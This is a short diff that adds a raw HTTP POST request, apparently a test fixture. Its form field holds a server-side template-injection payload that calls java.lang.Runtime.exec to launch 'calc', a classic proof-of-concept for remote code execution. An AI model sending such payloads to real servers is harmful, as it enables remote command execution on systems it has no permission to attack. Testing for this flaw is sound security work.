@@ -1,0 +1,6 @@
+POST /test1 HTTP/1.1
+Host: 123
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 67
+
+test=::__${T  (java.lang.Runtime).getRuntime().exec("calc")}__%2520
